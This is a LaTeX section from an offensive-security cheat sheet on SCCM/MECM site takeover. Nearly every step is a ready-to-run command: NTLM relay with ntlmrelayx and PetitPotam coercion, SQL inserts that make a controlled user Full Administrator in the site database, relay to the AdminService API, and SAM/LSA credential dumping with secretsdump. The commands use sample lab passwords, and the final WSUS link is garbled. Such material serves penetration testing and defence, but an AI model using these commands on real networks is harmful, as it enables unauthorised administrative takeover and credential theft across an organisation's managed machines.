\section{Site Takeover}


\subsection{Introduction}

The primary site server's computer account is member of the local Administrators group on the site database server and on every site server hosting the "SMS Provider" role in the hierarchy. This means it is possible to coerce the primary site server authentication and relay it to the database server and obtain an administrative access.
\begin{itemize}
    \item \url{https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf}
    \item \url{https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1}
    \item \url{https://www.thehacker.recipes/ad/movement/sccm-mecm#sccm-site-takeover}
\end{itemize}

\subsection{Relay to the site database server}

Setup a NTLM relay server to MSSQL or SMB:
\begin{verbatim}
# targetting MS-SQL
sudo ntlmrelayx.py -t "mssql://172.16.0.11" -smb2support -socks

# targeting SMB
ntlmrelayx.py -t "smb://siteDatabase.domain.local" -smb2support -socks
\end{verbatim}

Coerce the primary site server authentication via PetitPotam, PrinterBug ou whatever.

\begin{verbatim}
python3 PetitPotam.py -u lowpriv -p 'Jubeaz12345+-' -d haas.local 192.168.2.3 bran.haas.local
\end{verbatim}


\begin{verbatim}
proxychains mssqlclient.py HAAS/'BRAN$'@fenris.haas.local -windows-auth -no-pass
\end{verbatim}

{\bf check computer account on DB and create a new admin account for persistance}


{\bf Retrieve the controlled user SID}:
\begin{verbatim}
rpcclient dc03.haas.local -U 'haas.local\lowpriv%Jubeaz12345+-' -c "lookupnames lowpriv"

# And convert it in HEX format
from impacket.ldap import ldaptypes
sid=ldaptypes.LDAP_SID()
sid.fromCanonical('sid_value')
print('-1x' + ''.join('{:02X}'.format(b) for b in sid.getData()))
\end{verbatim}

{\bf Establish MECM privesc to full admin}:
\begin{verbatim}
-- Identify sccm db
SELECT name FROM master.dbo.sysdatabases
-- Switch to site database
use <site_db> # SCCM_HS1

--Add the SID, the name of the current user, and the site code to the RBAC_Admins table
INSERT INTO  RBAC_Admins 
    (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) 
    VALUES 
    (<SID_in_hex_format>,'DOMAIN\user',0,0,'','','','','<sccm_site_code>');

-- Retrieve the AdminID of the added user
SELECT AdminID,LogonName FROM RBAC_Admins;

-- Add RBAC_ExtendedPermissions granting the AdminID the Full Administrator (SMS0001R) RoleID for
-- for the “All Objects” scope (SMS00ALL), 
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) 
    VALUES (<AdminID>,'SMS0001R','SMS00ALL','29');

-- the “All Systems” scope (SMS00001), 
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) 
    VALUES (<AdminID>,'SMS0001R','SMS00001','1');

-- the “All Users and User Groups” scope (SMS00004)
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) 
    VALUES (<AdminID>,'SMS0001R','SMS00004','1');
\end{verbatim}
{\bf Note: Ensure to close the DB connection before proceeding.}


\verb+sccmhunter+ cat print all mssql command (including sid resolution)
\begin{verbatim}
python3 sccmhunter.py mssql -stacked -d haas.local -dc-ip 172.16.0.1 -tu lowpriv -sc HS1 -u lowpriv -p Jubeaz12345+-
\end{verbatim}

Success can be verified with \verb+SharpSCCM+ on a client computer.
\begin{verbatim}
SharpSCCM.exe get class-instances SMS_Admin
\end{verbatim}

or directly by accessing the admin:
\begin{verbatim}
python3 sccmhunter.py admin -u blwasp -p 'Password123!' -ip <SMS_ip>
\end{verbatim}



\subsection{Relay SMS Provider (AdminService API)}

The Primary Server account must be a member of the \verb+SMS Admins+ group. This group gives access to the \verb+WMI interfaces+ and the \verb+AdminService API+.

This REST API enables interaction with the SMS Provider and, by extension, with the MSSQL database via standardized HTTP requests. As a result, if the SMS Provider is installed on another server than the Primary Server, and if the API, which accepts NTLM authentication, among other things, is exposed on the server carrying the SMS Provider, it is then possible to relay this to the API and use it to send a request adding a new SCCM administrator user via the \verb+SMS_Admin WMI class+, which is integrated into the \verb+AdminService+ API.

Moreover, since the HTTP service rarely checks NTLM signatures, this attack is particularly effective.

If the HTTP API is accessible on the SMS Provider server, setup \href{https://github.com/fortra/impacket/pull/1593}{ntlmrelayx with this PR} to add a user as a new SCCM admin:
\begin{verbatim}
git clone -b feature/relay-sccm-adminservice --single-branch https://github.com/garrettfoster13/impacket.git relay-sccm
cd relay-sccm
python3 -m venv .sccmrelay
source .sccmrelay/bin/activate
python3 -m pip install .
cd relay-sccm/examples
source .sccmrelay/bin/activate

sudo ntlmrelayx.py -t https://<sccm_fqdn>/AdminService/wmi/SMS_Admin -smb2support \
    --adminservice \
    --logonname "<domain_netbios>\<user>" \
    --displayname "<domain_netbios>\<user>" \
    --objectsid <user_sid>
\end{verbatim}

then coerce the Primary Server

\begin{verbatim}
python3 PetitPotam.py -u lowpriv -p 'Jubeaz12345+-' -d haas.local 192.168.2.3 bran.haas.local
\end{verbatim}



\subsection{Relay from a passive to the active site server}
When high availability in required, it is possible to find a passive site server that will be used only if the active site server stop working. {\bf Its machine account must be a member of the local Administrators group on the active site server. It must also be an administrator of all SCCM systems deployed on the site, including the MSSQL database.}.

Setup a NTLM relay pointing to the active server and coerce an authentication from the passive server.
\begin{verbatim}
sudo ntlmrelayx.py -t activeServer.domain.local -smb2support -socks
\end{verbatim}

Then, through the proxy socks session, dump the SAM and LSA with secretsdump.

\begin{verbatim}
proxychains secretsdump.py 'LAB/SCCM02$'@172.50.0.21 -no-pass 
\end{verbatim}


The active site server must be a member of the SMS Provider administrators (it is member of the \verb+SMS Admins+ group), its credentials can be used to add a new controlled user to the \verb+Full Admin+ SCCM group.

\begin{verbatim}
python3 sccmhunter.py admin -u activeServer$ -p :<nthash> -ip <SMS_Provider>

() (C:\) >> add_admin controlledUser <controlledUser_SID>
() (C:\) >> show_admins
\end{verbatim}


\subsection{WSUS}

\href{https://www.²:ethehacker.recipes/ad/movement/mitm-and-coerced-authentications/wsus-spoofing}{Spoof the WSUS server and hijack the update} if the updates are pushed through HTTP and not HTTPS
